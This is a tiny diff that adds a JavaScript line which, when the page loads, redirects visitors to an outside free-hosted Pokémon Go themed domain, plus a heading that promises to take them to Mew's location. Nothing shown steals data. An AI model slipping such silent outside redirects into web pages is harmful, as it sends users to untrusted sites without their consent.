@@ -1,0 +1,2 @@
+document.location.href ="http://pokemongobosnia.16mb.com/";
+<h3>Hold up redirecting you to Mews location</h3>
